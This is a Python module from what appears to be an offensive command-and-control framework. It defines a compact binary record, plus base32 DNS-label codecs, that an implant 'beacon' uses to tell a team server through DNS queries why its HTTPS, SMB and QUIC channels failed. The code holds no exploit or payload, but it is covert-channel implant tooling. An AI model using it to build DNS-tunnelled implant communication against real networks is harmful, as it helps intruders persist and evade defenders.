#!/usr/bin/env python3
"""The rescue record: ten bytes that say why a beacon cannot get out.

When every upstream leg has failed, the beacon's one remaining channel is
DNS, and DNS carries nothing upstream — a bare TXT query with the agent id
in the name. This module is the format that changes that: a fixed-width
record small enough to survive encryption and base32 and still fit in two
DNS labels, plus the codec that puts it there and takes it back out.

It is its own file because three places must agree on it byte for byte —
the implant, the DNS listener and the team server — and only two of them
can import it. `beacon.py` is served to a target as source text by the
generator, so it carries a copy; a test compares the copy with this file,
which is the price of the arrangement and cheaper than shipping the whole
implant into a listener container. `relay.py`'s comment on
`_PAYLOAD_FIELDS` explains the same constraint from the other side.

Why fixed-width binary rather than JSON: the budget. A DNS label holds 63
characters, AES-GCM costs 28 bytes before any payload, and the JSON
wrapper `_encrypt` puts around its argument costs a dozen more. There is
no record size at all that fits in one label, and only a small one fits in
two. Codes and flags fit. Prose does not — which is also why no hostname,
URL or credential can ride along here even by accident.

Stdlib only, like everything the implant's format touches.
"""

import base64
import binascii
import hashlib
import math
import struct
from typing import Dict, Tuple

VERSION = 1

# The marker label that tells the listener this query carries a payload.
# `b` is the tasking query's marker; a separate letter means the listener
# decides by name and never by counting labels.
MARKER = "r"

# The transports, in the order they are packed. This is the beacon's
# `_FALLBACK_TRANSPORTS` order, and it is positional in the struct, so it
# is not a detail a later reader may reorder for tidiness.
TRANSPORTS = ("https", "dns", "smb", "quic")

# Why a leg produced nothing. `not_attempted` is zero so that an unset
# field in the struct reads as the truth: the loop short-circuits, and a
# leg below one that answered was never tried.
CLASSES = {
    "not_attempted": 0,
    # The resolver or the host answered, and there was simply nothing to
    # deliver. Only DNS uses this, and it is the distinction the whole
    # rescue rests on: `None` from `_beacon_dns` otherwise cannot be told
    # apart from a resolver that never answered.
    "answered": 1,
    "unreachable": 2,
    "refused": 3,
    "timed_out": 4,
    "tls_failed": 5,
    "http_status": 6,
    "auth_required": 7,
    "bad_payload": 8,
    "resolve_failed": 9,
}

FLAG_PROXY_FOUND = 0x01
FLAG_DOT1X_SEEN = 0x02
FLAG_PORTAL_ANSWERED = 0x04
FLAG_DNS_ANSWERED = 0x08

# The key the record travels under. A dedicated key rather than an
# `action` value, for one reason that is pure arithmetic: `{"action":
# "rescue","d":...}` costs 125 base32 characters, which is two labels of
# exactly 63 -- one byte of record growth from being undeliverable. `{"r":
# ...}` costs 96 and leaves 101 characters for the zone. The server
# therefore branches on this key before its action dispatch, which is an
# explicit contract and not a guess about a payload's shape.
WRAPPER_KEY = "r"

# version + agent fingerprint + (class, code) per transport + flags.
#
# The code is two bytes, not one, and that is not generosity: an HTTP status
# is the most useful code this record carries, and 407 — a proxy demanding
# authentication — does not fit in a byte. Nor does any three-digit status
# above 255. One byte would have meant dropping the best diagnostic or
# encoding it as an offset a reader has to undo in their head.
_STRUCT = struct.Struct("!BHBHBHBHBHB")
RECORD_BYTES = _STRUCT.size

# What the full chain produces, so a change to the record or to `_encrypt`'s
# wrapper shows up as a failing assertion rather than a third label:
#   16 bytes -> base64 24 -> {"r":"..."} 32 -> AES-GCM 60 -> base32 96
PAYLOAD_CHARS = 96

# Two labels of 63. Past this the name would need a third, which no
# listener parses, so it is refused rather than emitted.
_MAX_PAYLOAD_CHARS = 126

_CLASS_VALUES = frozenset(CLASSES.values())
_MAX_CODE = 0xFFFF


def fingerprint(agent_id: str) -> int:
    """Two bytes that identify which beacon is stuck.

    The full id does not fit: thirty-two hex characters would cost sixty
    base32 characters and a third label. Two bytes of a digest do, and the
    server matches them against the agents it knows.

    The cost is honest and small: with a fleet of a hundred, two agents
    share a fingerprint about once in seven hundred, and the consequence is
    one diagnostic attributed to the wrong beacon -- not a wrong command,
    because nothing is dispatched from this.
    """
    digest = hashlib.sha256((agent_id or "").encode("utf-8", "replace"))
    return int.from_bytes(digest.digest()[:2], "big")


def pack(per_transport: Dict[str, Tuple[int, int]], flags: int,
         agent_fingerprint: int = 0) -> bytes:
    """The record, as bytes. Missing transports read as `not_attempted`.

    Every bad value is refused rather than squeezed: a code outside two
    bytes would keep its low bits and report something that did not happen,
    and an unknown transport name would be dropped, so the record would
    claim that leg was never tried. Both name the field.
    """
    fields = []
    for name in per_transport:
        if name not in TRANSPORTS:
            raise ValueError(
                "unknown transport %r; expected one of %s"
                % (name, ", ".join(TRANSPORTS)))
    for name in TRANSPORTS:
        klass, code = per_transport.get(name, (CLASSES["not_attempted"], 0))
        if klass not in _CLASS_VALUES:
            raise ValueError("transport %r has class %r, which is not one of "
                             "CLASSES" % (name, klass))
        if not 0 <= int(code) <= _MAX_CODE:
            raise ValueError("transport %r has code %r; a code must fit in "
                             "two bytes (0-%d)" % (name, code, _MAX_CODE))
        fields.extend((int(klass), int(code)))
    if not 0 <= int(flags) <= 0xFF:
        raise ValueError("flags must fit in one byte (0-255), got %r" % (flags,))
    if not 0 <= int(agent_fingerprint) <= 0xFFFF:
        raise ValueError("agent_fingerprint must fit in two bytes, got %r"
                         % (agent_fingerprint,))
    return _STRUCT.pack(VERSION, int(agent_fingerprint),
                        *(fields + [int(flags)]))


def unpack(raw: bytes) -> dict:
    """The record, as a dict. Raises on a wrong length or an unknown version.

    A version this file does not know is refused rather than read
    optimistically: the struct would still unpack, and the result would be
    a confident lie about which leg failed how.
    """
    if not isinstance(raw, (bytes, bytearray)) or len(raw) != RECORD_BYTES:
        raise ValueError("a record is exactly %d bytes, got %r"
                         % (RECORD_BYTES, len(raw) if raw is not None else raw))
    values = _STRUCT.unpack(bytes(raw))
    version = values[0]
    if version != VERSION:
        raise ValueError("record version %d is not %d" % (version, VERSION))
    out = {"version": version, "fingerprint": values[1],
           "flags": values[-1]}
    for index, name in enumerate(TRANSPORTS):
        out[name] = (values[2 + index * 2], values[3 + index * 2])
    return out


def to_labels(b64_ciphertext: str) -> Tuple[str, str]:
    """Two DNS labels carrying `_encrypt`'s output.

    `_encrypt` returns **base64**; a label needs base32 of the raw
    ciphertext. Base32-ing the base64 *string* is the trap — it yields 116
    characters and three labels, which is legal DNS, plausible to read, and
    only shows up as an over-long name on a live wire.

    The split is a halving rather than a constant: the margin is one
    character wide, so a later change to the record or to `_encrypt`'s
    wrapper would silently need a third label if the boundary were fixed.
    """
    try:
        raw = base64.b64decode(b64_ciphertext, validate=True)
    except (binascii.Error, ValueError):
        raise ValueError("not base64") from None
    text = base64.b32encode(raw).decode().lower().rstrip("=")
    if not text:
        raise ValueError("nothing to encode")
    if len(text) > _MAX_PAYLOAD_CHARS:
        raise ValueError(
            "payload is %d base32 characters; two labels hold %d"
            % (len(text), _MAX_PAYLOAD_CHARS))
    cut = math.ceil(len(text) / 2)
    return text[:cut], text[cut:]


def from_labels(label_1: str, label_2: str) -> str:
    """The inverse of `to_labels`, returning base64 for `_decrypt`."""
    text = (label_1 + label_2).upper()
    padding = "=" * (-len(text) % 8)
    try:
        raw = base64.b32decode(text + padding)
    except (binascii.Error, ValueError):
        raise ValueError("not base32") from None
    if not raw:
        raise ValueError("nothing to decode")
    return base64.b64encode(raw).decode()
